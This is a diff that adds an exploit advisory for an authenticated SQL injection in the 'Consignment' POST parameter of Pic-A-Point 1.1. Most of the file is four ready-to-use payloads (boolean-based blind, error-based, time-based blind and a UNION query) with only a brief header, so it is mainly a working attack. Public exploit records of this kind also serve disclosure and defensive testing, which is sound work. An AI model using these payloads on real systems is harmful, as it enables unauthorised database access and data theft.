@@ -1,0 +1,34 @@
+# Exploit Title: citecodecrashers Pic-A-Point 1.1 - 'Consignment' SQL Injection
+# Author: Cakes
+# Discovery Date: 2019-09-26
+# Vendor Homepage: https://github.com/citecodecrashers/Pic-A-Point
+# Software Link: https://github.com/citecodecrashers/Pic-A-Point/archive/master.zip
+# Tested Version: 1.1
+# Tested on OS: CentOS 7
+# CVE: N/A
+
+# Discription:
+# Simple SQL injection after application authentication. 
+
+# POST Request
+
+# Parameter: Consignment (POST)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+
+Payload: Consignment=1234' AND 9752=(SELECT (CASE WHEN (9752=9752) THEN 9752 ELSE (SELECT 1018 UNION SELECT 3533) END))-- QBEy&Submit=Trace now
+
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+
+Payload: Consignment=1234' AND (SELECT 4396 FROM(SELECT COUNT(*),CONCAT(0x7162707871,(SELECT (ELT(4396=4396,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hufy&Submit=Trace now
+
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+Payload: Consignment=1234' AND (SELECT 9267 FROM (SELECT(SLEEP(5)))qpkL)-- OiWK&Submit=Trace now
+
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 20 columns
+
+Payload: Consignment=1234' UNION ALL SELECT NULL,CONCAT(0x7162707871,0x614b666177515872456a7177706f6b654d54744e75644e4b597648496742464c6346656865654e67,0x716a7a7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cUud&Submit=Trace now
